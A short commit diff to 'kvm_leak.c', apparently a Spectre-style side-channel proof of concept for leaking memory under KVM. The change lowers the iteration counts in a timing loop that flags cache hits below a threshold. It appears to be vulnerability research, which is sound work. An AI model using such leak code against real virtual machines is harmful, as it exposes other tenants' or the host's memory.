cc7084b6e94da726c5ff5dca1e50415327924836
Thijs Raymakers <thijs@raymakers.nl>
2024-08-19 10:23:39 +0200

    Reduce amount of iterations

--- src/kvm_leak.c
+++ src/kvm_leak.c
@@ -133,11 +133,11 @@ size_t find_min(void *buf) {
       for (int64_t page = PAGES_IN_BATCH - 1; page >= 0; --page) {
         size_t idx = batch + (ELEMENTS_PER_PAGE * page) + offset;
 
-        size_t time = access_buffer_with_spectre(buf, idx, 100);
+        size_t time = access_buffer_with_spectre(buf, idx, 5);
         if (time < 200) {
-          time = access_buffer_with_spectre(buf, idx, 10000);
+          time = access_buffer_with_spectre(buf, idx, 1000);
           if (time < 180) {
-            time = access_buffer_with_spectre(buf, idx, 100000);
+            time = access_buffer_with_spectre(buf, idx, 10000);
             if (time < CACHE_HIT_THRESHOLD) {
               printf("\nHIT!\nidx: %lx\ntime: %ld\n", idx, time);
             }
